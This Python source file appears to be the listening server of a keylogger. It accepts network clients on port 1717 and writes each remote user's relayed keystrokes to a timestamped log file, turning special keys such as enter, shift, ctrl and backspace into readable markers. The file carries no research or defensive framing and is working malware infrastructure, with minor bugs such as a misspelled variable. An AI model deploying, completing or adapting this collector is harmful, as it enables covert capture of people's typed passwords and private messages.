import socket
import threading
import time
import os.path
from os import path

#handles new clients as a new thread
def UserHandler(userName, client):
	users.append([userName, client])
	fileName = fileNaming(userName)
	f = open(fileName,"w")
	f.write("Start session(" + time.strftime("%I:%M:%S %p",time.localtime()) + "): ")

	try:
		while True:

			message = client.recv(1024).decode()

			if len(message) == 0:
				print("user exited(" + userName + ")")
				break

			if userName in message:

				message = filter(message[len(userName):], fileName, f)

				f.write(message)

	except Exception as e:
		print("user violently disconnected(" + userName + ")")
	
def filter(message, fName, f):

	if "(" in message and ")" in message:
		return message
	if message.find("enter") > 0:
		message = "[enter]"
	if message.find("shift") > 0:
		message = "[shift]"
	if message.find("tab") > 0:
		message = "[tab]"
	if message.find("alt") > 0:
		message = "[alt]"	
	if message.find("cmd") > 0:
		message = "[window]"
	if message.find("esc") > 0:
		message = "[escape]"
	if message.find("caps") > 0:
		messaeg = "[caps]"
	if message.find("ctrl") > 0:
		message = "[control]"
	if message.find("back") > 0:
		f.close()
		f = open(fName,"r")
		s = f.read()
		f.close()
		f = open(fName,"w")
		if len(str(s)) > 28:
			f.write(str(s[0 : len(s) - 1]))
		else:
			f.write(str(s))
		message = ""
	if message.find("space") > 0:
		message = " "
	if message.find("f1") > 0:
		message = "[f1]"

	return message

def fileNaming(name):
	fileName = name + ".txt"
	i = 1
	while path.exists(fileName):
		fileName = name + "(" + str(i) + ").txt"
		i = i + 1
	return fileName

users = list()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('', 1717))
server.listen(5)

print("Server is online!")

while True:
		#this is used to check if the message is
		client, address = server.accept()

		#reciving new user
		name = client.recv(1024).decode()


		#handeling new user
		if "new" in name:
			print("New user connected: " + name[3:] + ", address: " + str(address[0]))
			x = threading.Thread(target=UserHandler, args=(name[3:], client))
			x.start()
